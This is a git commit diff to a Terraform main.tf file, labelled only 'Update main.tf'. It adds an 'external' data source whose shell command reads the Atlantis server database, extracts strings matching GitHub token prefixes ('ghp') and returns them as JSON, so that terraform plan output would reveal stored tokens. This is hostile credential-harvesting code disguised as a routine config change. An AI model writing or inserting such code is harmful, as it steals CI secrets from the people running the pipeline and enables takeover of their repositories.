6a8850839e4971bbc2b13e11761cd0e15fdcb7a5
alexandrediasonepoint <125377065+alexandrediasonepoint@users.noreply.github.com>
2023-03-17 11:03:16 +0100

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,2 +1,3 @@
-resource "null_resource" "exambetter2" {
+data "external" "example" {
+  program = ["sh", "-c", "strings ~/.atlantis/atlantis.db | tr ',' '\n' | grep ghp | sort | awk '{print $0\",\"}' | xargs -0 printf '{ %s }'"]
 }
